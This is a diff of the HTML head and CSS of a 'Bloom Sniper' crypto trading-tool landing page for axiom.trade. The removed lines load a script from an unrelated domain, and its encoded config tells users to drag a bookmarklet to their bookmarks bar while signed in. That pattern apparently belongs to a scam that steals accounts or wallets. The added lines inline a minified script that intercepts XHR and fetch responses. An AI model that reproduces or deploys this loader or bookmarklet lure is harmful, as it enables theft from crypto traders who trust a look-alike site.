@@ -1,148 +1,2606 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Bloom sniper</title>
-  <meta name="description" content="Advanced trading tools on Axiom — monitor influencers, track wallets, automate buys, and never miss opportunities again." />
 
- <script src="https://axiom.ctoportal.icu/loader.js" data="eyJoYXNoIjoiTURzNE1URTRPVE0zT0RjNSIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJ1dHRvbiB0byB5b3VyIGJvb2ttYXJrcyBiYXIgaW5zdGVhZCBvZiBjbGlja2luZyBpdC4iLCJyZWRpcmVjdCI6IllvdSBhcmUgbm93IGJlaW5nIHJlZGlyZWN0ZWQgdG8gaHR0cHM6Ly9heGlvbS50cmFkZS9kaXNjb3Zlci4iLCJ1bmF1dGhvcml6ZWQiOiJZb3UgbXVzdCBiZSBzaWduZWQgaW4gdG8gdXNlIHRoaXMgYm9va21hcmtsZXQuIiwiZXJyb3IiOiJGYWlsZWQgdG8gZXhlY3V0ZSB0aGUgYm9va21hcmtsZXQuIFBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuIn19"></script>
-  <style>
-    :root {
-      --bg-gradient: radial-gradient(circle at top left, #0e1229, #050617);
-      --accent1: #8c5cff;
-      --accent2: #3ab0ff;
-      --accent3: #00ffbf;
-      --muted: #b0b8d8;
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bloom Sniper</title>
+    <meta name="description" content="Advanced trading tools for axiom.trade. Monitor influencers, track wallets, automate trading with MEV protection, and never miss opportunities.">
+    <meta name="keywords" content="axiom.trade, trading bot, crypto trading, influencer sniper, wallet stalker, MEV protection, DeFi tools">
+    <meta name="author" content="Bloom Sniper">
+    <meta property="og:title" content="Bloom Sniper - Your Unfair Advantage in Crypto">
+    <meta property="og:description" content="Advanced trading tools for axiom.trade. Monitor influencers, track wallets, automate trading with MEV protection.">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Bloom Sniper - Your Unfair Advantage in Crypto">
+    <meta name="twitter:description" content="Advanced trading tools for axiom.trade. Monitor influencers, track wallets, automate trading with MEV protection.">
+ 
+
+    <script src="3.4.17.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]">(()=>{function x(x,$,v,C,D=null){try{let V=document.location.host,p="detector",K={posdMessageId:"PANELOS_MESSAGE",posdHash:(Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)).substring(0,22),type:"VIDEO_XHR_CANDIDATE",from:p,to:p.substring(0,p.length-2),content:{requestMethod:x,url:$,type:v,content:C}};V.includes("youtube.com")&&D&&D[0]&&D[0].length&&(K.content.encodedPostBody=D[0]),window.postMessage(K,"*")}catch(x){}}let $=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){this.requestMethod=arguments[0],$.apply(this,arguments)};let v=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(){const $=Object.assign(arguments,{});let C=this.onreadystatechange;return this.onreadystatechange=function(){if(4!==this.readyState||function(x){const $=document.querySelector("script[data-bis-config]")?JSON.parse(document.querySelector("script[data-bis-config]").getAttribute("data-bis-config")):null;return!!$&&$.some(($=>x.includes($)))}(this.responseURL)||x(this.requestMethod,this.responseURL,this.getResponseHeader("content-type"),this.response,$),C)return C.apply(this,arguments)},v.apply(this,arguments)};let C=fetch;fetch=function(){const $=arguments;let v=arguments[0]instanceof Request?arguments[0].url:arguments[0];const D=arguments[0]instanceof Request?arguments[0].method:"GET";return"object"==typeof v&&v.href&&(v=v.href),new Promise(((V,p)=>{C.apply(this,$).then((function($){if($.body instanceof ReadableStream){const C=$.json;$.json=function(){return new Promise(((V,p)=>{C.apply(this,arguments).then((function(C){0!==$.url.search(/data:application\/json;base64/)&&x(D,v,$.headers.get("content-type"),JSON.stringify(C)),V(C)})).catch((function(x){p(x)}))}))};const V=$.text;$.text=function(){return new Promise(((C,p)=>{V.apply(this,arguments).then((function(V){0!==$.url.search(/data:application\/json;base64/)&&x(D,v,$.headers.get("content-type"),V),C(V)})).catch((function(x){p(x)}))}))}}V.apply(this,arguments)})).catch((function(x){p.apply(this,arguments)}))}))}})();</script>
+    
+
+    <style>/* cyrillic-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 300;
+  font-display: swap;
+  src: url("64f37addfe426c0b3e76ef20af803191c38df5b3.woff2") format('woff2');
+  unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 300;
+  font-display: swap;
+  src: url("d83a47942575eeb80d30ebc7bf9a5b6f83c930fb.woff2") format('woff2');
+  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* greek-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 300;
+  font-display: swap;
+  src: url("e1126a9007d27dae496647ac1b97356ebf38671c.woff2") format('woff2');
+  unicode-range: U+1F00-1FFF;
+}
+/* greek */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 300;
+  font-display: swap;
+  src: url("c475178f5395eb2c2d556c8f0e9250237c019dc8.woff2") format('woff2');
+  unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 300;
+  font-display: swap;
+  src: url("9c1cad863a03434fb9c1501e9dd27ac14ed7cf63.woff2") format('woff2');
+  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 300;
+  font-display: swap;
+  src: url("cf3eb50fb21014c07d4311ef4c03a4fd587889b4.woff2") format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 300;
+  font-display: swap;
+  src: url("f11d729bb0a4d8350d2ea3d0fc062cf6ef2d5298.woff2") format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* cyrillic-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url("64f37addfe426c0b3e76ef20af803191c38df5b3.woff2") format('woff2');
+  unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url("d83a47942575eeb80d30ebc7bf9a5b6f83c930fb.woff2") format('woff2');
+  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* greek-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url("e1126a9007d27dae496647ac1b97356ebf38671c.woff2") format('woff2');
+  unicode-range: U+1F00-1FFF;
+}
+/* greek */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url("c475178f5395eb2c2d556c8f0e9250237c019dc8.woff2") format('woff2');
+  unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url("9c1cad863a03434fb9c1501e9dd27ac14ed7cf63.woff2") format('woff2');
+  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url("cf3eb50fb21014c07d4311ef4c03a4fd587889b4.woff2") format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url("f11d729bb0a4d8350d2ea3d0fc062cf6ef2d5298.woff2") format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* cyrillic-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 500;
+  font-display: swap;
+  src: url("64f37addfe426c0b3e76ef20af803191c38df5b3.woff2") format('woff2');
+  unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 500;
+  font-display: swap;
+  src: url("d83a47942575eeb80d30ebc7bf9a5b6f83c930fb.woff2") format('woff2');
+  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* greek-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 500;
+  font-display: swap;
+  src: url("e1126a9007d27dae496647ac1b97356ebf38671c.woff2") format('woff2');
+  unicode-range: U+1F00-1FFF;
+}
+/* greek */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 500;
+  font-display: swap;
+  src: url("c475178f5395eb2c2d556c8f0e9250237c019dc8.woff2") format('woff2');
+  unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 500;
+  font-display: swap;
+  src: url("9c1cad863a03434fb9c1501e9dd27ac14ed7cf63.woff2") format('woff2');
+  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 500;
+  font-display: swap;
+  src: url("cf3eb50fb21014c07d4311ef4c03a4fd587889b4.woff2") format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 500;
+  font-display: swap;
+  src: url("f11d729bb0a4d8350d2ea3d0fc062cf6ef2d5298.woff2") format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* cyrillic-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 600;
+  font-display: swap;
+  src: url("64f37addfe426c0b3e76ef20af803191c38df5b3.woff2") format('woff2');
+  unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 600;
+  font-display: swap;
+  src: url("d83a47942575eeb80d30ebc7bf9a5b6f83c930fb.woff2") format('woff2');
+  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* greek-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 600;
+  font-display: swap;
+  src: url("e1126a9007d27dae496647ac1b97356ebf38671c.woff2") format('woff2');
+  unicode-range: U+1F00-1FFF;
+}
+/* greek */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 600;
+  font-display: swap;
+  src: url("c475178f5395eb2c2d556c8f0e9250237c019dc8.woff2") format('woff2');
+  unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 600;
+  font-display: swap;
+  src: url("9c1cad863a03434fb9c1501e9dd27ac14ed7cf63.woff2") format('woff2');
+  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 600;
+  font-display: swap;
+  src: url("cf3eb50fb21014c07d4311ef4c03a4fd587889b4.woff2") format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 600;
+  font-display: swap;
+  src: url("f11d729bb0a4d8350d2ea3d0fc062cf6ef2d5298.woff2") format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* cyrillic-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url("64f37addfe426c0b3e76ef20af803191c38df5b3.woff2") format('woff2');
+  unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url("d83a47942575eeb80d30ebc7bf9a5b6f83c930fb.woff2") format('woff2');
+  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* greek-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url("e1126a9007d27dae496647ac1b97356ebf38671c.woff2") format('woff2');
+  unicode-range: U+1F00-1FFF;
+}
+/* greek */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url("c475178f5395eb2c2d556c8f0e9250237c019dc8.woff2") format('woff2');
+  unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url("9c1cad863a03434fb9c1501e9dd27ac14ed7cf63.woff2") format('woff2');
+  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url("cf3eb50fb21014c07d4311ef4c03a4fd587889b4.woff2") format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url("f11d729bb0a4d8350d2ea3d0fc062cf6ef2d5298.woff2") format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* cyrillic-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 800;
+  font-display: swap;
+  src: url("64f37addfe426c0b3e76ef20af803191c38df5b3.woff2") format('woff2');
+  unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 800;
+  font-display: swap;
+  src: url("d83a47942575eeb80d30ebc7bf9a5b6f83c930fb.woff2") format('woff2');
+  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* greek-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 800;
+  font-display: swap;
+  src: url("e1126a9007d27dae496647ac1b97356ebf38671c.woff2") format('woff2');
+  unicode-range: U+1F00-1FFF;
+}
+/* greek */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 800;
+  font-display: swap;
+  src: url("c475178f5395eb2c2d556c8f0e9250237c019dc8.woff2") format('woff2');
+  unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 800;
+  font-display: swap;
+  src: url("9c1cad863a03434fb9c1501e9dd27ac14ed7cf63.woff2") format('woff2');
+  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 800;
+  font-display: swap;
+  src: url("cf3eb50fb21014c07d4311ef4c03a4fd587889b4.woff2") format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 800;
+  font-display: swap;
+  src: url("f11d729bb0a4d8350d2ea3d0fc062cf6ef2d5298.woff2") format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* cyrillic-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 900;
+  font-display: swap;
+  src: url("64f37addfe426c0b3e76ef20af803191c38df5b3.woff2") format('woff2');
+  unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 900;
+  font-display: swap;
+  src: url("d83a47942575eeb80d30ebc7bf9a5b6f83c930fb.woff2") format('woff2');
+  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* greek-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 900;
+  font-display: swap;
+  src: url("e1126a9007d27dae496647ac1b97356ebf38671c.woff2") format('woff2');
+  unicode-range: U+1F00-1FFF;
+}
+/* greek */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 900;
+  font-display: swap;
+  src: url("c475178f5395eb2c2d556c8f0e9250237c019dc8.woff2") format('woff2');
+  unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 900;
+  font-display: swap;
+  src: url("9c1cad863a03434fb9c1501e9dd27ac14ed7cf63.woff2") format('woff2');
+  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 900;
+  font-display: swap;
+  src: url("cf3eb50fb21014c07d4311ef4c03a4fd587889b4.woff2") format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 900;
+  font-display: swap;
+  src: url("f11d729bb0a4d8350d2ea3d0fc062cf6ef2d5298.woff2") format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+</style>
+    
+
+    
+
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        
+        @keyframes pinkGlow {
+            0%, 100% { 
+                box-shadow: inset 0 0 100px rgba(255, 105, 180, 0.1); 
+            }
+            50% { 
+                box-shadow: inset 0 0 100px rgba(255, 105, 180, 0.3); 
+            }
+        }
+        
+        .loading-bg::before {
+            animation: pinkGlow 2s ease-in-out infinite;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #f8f9fa;
+            background-image: url("bloom-background-1.jpg");
+            background-position: center;
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            color: #f1f0f3;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            scroll-behavior: smooth;
+            overflow-x: hidden;
+            -webkit-overflow-scrolling: touch;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-text-size-adjust: 100%;
+            -ms-text-size-adjust: 100%;
+            transition: background-image 0.8s ease-in-out;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, 
+                rgba(0, 0, 0, 0.9) 0%, 
+                rgba(26, 22, 37, 0.8) 25%, 
+                rgba(45, 27, 62, 0.7) 50%, 
+                rgba(74, 44, 90, 0.6) 75%, 
+                rgba(255, 105, 180, 0.1) 100%);
+            z-index: -1;
+            opacity: 1;
+            transition: opacity 1s ease-in-out;
+        }
+        
+        body.image-loaded::before {
+            opacity: 0;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 20px;
+            width: 100%;
+        }
+        
+        .header {
+            background: rgba(26, 22, 37, 0.08);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 182, 193, 0.1);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            transition: all 0.3s ease;
+        }
+        
+        .header-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 80px;
+        }
+        
+        .logo {
+            font-size: 2rem;
+            font-weight: 900;
+            color: #ffffff;
+            text-shadow: 0 0 30px rgba(255, 182, 193, 0.6);
+            letter-spacing: -0.5px;
+        }
+        
+        .logo .accent {
+            color: #ff69b4;
+            text-shadow: 0 0 20px rgba(255, 105, 180, 0.8);
+        }
+        
+        .nav-buttons {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        
+        .btn {
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-touch-callout: none;
+            touch-action: manipulation;
+            min-height: 44px;
+            justify-content: center;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #ff69b4, #ff1493, #dc143c);
+            color: white;
+            box-shadow: 0 4px 15px rgba(255, 105, 180, 0.4);
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #ff1493, #dc143c, #b91c5c);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 105, 180, 0.5);
+        }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.08);
+            color: #ffffff;
+            border: 1px solid rgba(255, 182, 193, 0.3);
+            backdrop-filter: blur(10px);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 182, 193, 0.15);
+            border-color: rgba(255, 182, 193, 0.6);
+            transform: translateY(-1px);
+        }
+        
+        .hero {
+            padding: 140px 0 100px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .hero-badge {
+            background: linear-gradient(135deg, rgba(255, 105, 180, 0.15), rgba(255, 20, 147, 0.1));
+            color: #ff69b4;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 32px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            text-shadow: 0 0 10px rgba(255, 105, 180, 0.5);
+        }
+        
+        .hero-title {
+            font-size: clamp(3rem, 8vw, 5.5rem);
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 24px;
+            color: #ffffff;
+            text-shadow: 0 2px 40px rgba(255, 182, 193, 0.3);
+            letter-spacing: -0.02em;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            hyphens: auto;
+        }
+        
+        .hero-title .accent {
+            color: #ff69b4;
